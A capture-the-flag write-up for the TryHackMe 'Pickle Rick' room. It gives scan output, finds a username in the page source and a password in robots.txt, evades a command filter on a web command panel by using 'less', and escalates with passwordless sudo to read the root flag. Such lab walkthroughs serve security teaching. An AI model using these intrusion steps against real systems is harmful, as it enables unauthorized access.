# Pickle Rick

---
Date: 2021-12-20  
Author: Michael Baumberger  
[TryHackMe link](https://tryhackme.com/room/picklerick)
---

# Task 1 | Pickle Rick

First we do a nmap scan:

    nmap -sC -sV -p- 10.10.26.43
    Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-20 20:18 CET
    Nmap scan report for 10.10.26.43
    Host is up (0.052s latency).
    Not shown: 65533 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 2f:c1:a6:22:78:e6:f4:9e:8c:c4:7e:ff:6a:24:02:a9 (RSA)
    |   256 d2:e1:3a:4e:e4:f0:29:50:f1:7c:a1:15:b6:78:ab:2e (ECDSA)
    |_  256 ad:b2:a1:d9:bf:25:a6:82:67:39:51:34:ca:c3:48:a7 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Rick is sup4r cool
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

First we check out the website running on port 80 and start a gobuster scan:

    gobuster dir --url http://10.10.26.43/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.26.43/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Timeout:                 10s
    ===============================================================
    2021/12/20 20:29:17 Starting gobuster in directory enumeration mode
    ===============================================================
    /assets               (Status: 301) [Size: 311] [--> http://10.10.26.43/assets/]
    
    ===============================================================
    2021/12/20 20:43:09 Finished
    ===============================================================

And we also start a dirbuster scan:

    dirb http://10.10.26.43
    
    -----------------
    DIRB v2.22
    By The Dark Raver
    -----------------
    
    START_TIME: Mon Dec 20 20:48:16 2021
    URL_BASE: http://10.10.26.43/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
    
    -----------------
    
    GENERATED WORDS: 4612
    
    ---- Scanning URL: http://10.10.26.43/ ----
    ==> DIRECTORY: http://10.10.26.43/assets/
    [+] http://10.10.26.43/index.html (CODE:200|SIZE:1062)
    [+] http://10.10.26.43/robots.txt (CODE:200|SIZE:17)
    [+] http://10.10.26.43/server-status (CODE:403|SIZE:299)
    
    ---- Entering directory: http://10.10.26.43/assets/ ----
    (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
    
    -----------------
    END_TIME: Mon Dec 20 20:52:40 2021
    DOWNLOADED: 4612 - FOUND: 3

And also a nikto scan:

    nikto -h 10.10.26.43
    [-] Nikto v2.1.6
    ---------------------------------------------------------------------------
    [+] Target IP:          10.10.26.43
    [+] Target Hostname:    10.10.26.43
    [+] Target Port:        80
    [+] Start Time:         2021-12-20 20:55:49 (GMT1)
    ---------------------------------------------------------------------------
    [+] Server: Apache/2.4.18 (Ubuntu)
    [+] The anti-clickjacking X-Frame-Options header is not present.
    [+] The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    [+] The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    [+] No CGI Directories found (use '-C all' to force check all possible dirs)
    [+] Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
    [+] Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
    [+] Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
    [+] Cookie PHPSESSID created without the httponly flag
    [+] OSVDB-3233: /icons/README: Apache default file found.
    [+] /login.php: Admin login page/section found.
    [+] 7890 requests: 0 error(s) and 9 item(s) reported on remote host
    [+] End Time:           2021-12-20 21:04:21 (GMT1) (512 seconds)
    ---------------------------------------------------------------------------

During the gobuster and dirbuster scan we can look at the web pages source code und see the note with the *Username 'R1ckRul3s'*.

We see the result */assets* in the gobuster scan so we look at this and see those files:

    bootstrap.min.css	2019-02-10 16:37	119K	 
    bootstrap.min.js	2019-02-10 16:37	37K	 
    fail.gif	        2019-02-10 16:37	49K	 
    jquery.min.js	    2019-02-10 16:37	85K	 
    picklerick.gif	    2019-02-10 16:37	222K	 
    portal.jpg	        2019-02-10 16:37	50K	 
    rickandmorty.jpeg	2019-02-10 16:37	488K	 

We can download them but I dont think that they have anything special on it.
Now  the dirbuster scan is finished and we can look at the robots.txt:

    Wubbalubbadubdub

Why?????? 
Ok I don't thing that helps us, so we check out the *'/login.php' page* from nikto and we see a login form.

We already found the username 'R1ckRul3s' in the 'index.html' code.
Now we can try some passwords and because of the suspicious content of the 'robots.txt' I tried it as password and it worked!!
we got redirected to the *page 'portal.php'*.
On the first look and test it looks like we have code execution or something. 
Lets try 'ls' and we see numerus of files and also the *file 'Sup3rS3cretPickl3Ingred.txt'* which we were searching for.

If we try to 'cat' the file 'Sup3rS3cretPickl3Ingred.txt' we get the message:

    Command disabled to make it hard for future PICKLEEEE RICCCKKKK.

Now we know there is some validation.
But it looks like the file is in the same directory as the webserver is serving out login.php and index.html so we can try to call the file like that:

    http://10.10.26.43/Sup3rS3cretPickl3Ingred.txt

Yes we can **read the file like this and get our first flag**.

We know that we have command execution so lets try to trick the validation. 
As example we can list the whole '/' directory with 'ls -la /'.
We can also see all home directories with 'ls -la /home' and the home folder of rick with 'ls -la /home/rick' and there we find the second ingredient.

Before we only tried to cat the file but we can try another tool and see if it is also blocked:

    less /home/rick/'second ingredients'

It worked and we get **the second flag**.

We can think that the last flag will be in the roots home so '/root' but if we try to read that directory with 'ls -la /root' we dont get back anything.
With the command 'whoami' we see that we are only 'www-data' and this user normaly doesn't have permission to read the root's home folder.
We can *check what permissions we have with 'sudo -l'*:

    Matching Defaults entries for www-data on ip-10-10-26-43.eu-west-1.compute.internal:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User www-data may run the following commands on ip-10-10-26-43.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL

As we see we can execute any command without supplying a password. So we can execute 'sudo ls -la /root' and we get a result this time:

    total 28
    drwx------  4 root root 4096 Feb 10  2019 .
    drwxr-xr-x 23 root root 4096 Dec 20 19:15 ..
    -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
    -rw-r--r--  1 root root  148 Aug 17  2015 .profile
    drwx------  2 root root 4096 Feb 10  2019 .ssh
    -rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
    drwxr-xr-x  3 root root 4096 Feb 10  2019 snap

As we can see there is most likely our 3 flag in the file '3rd.txt' so lets read it:

    sudo less /root/3rd.txt

And we get our **3rd flag**!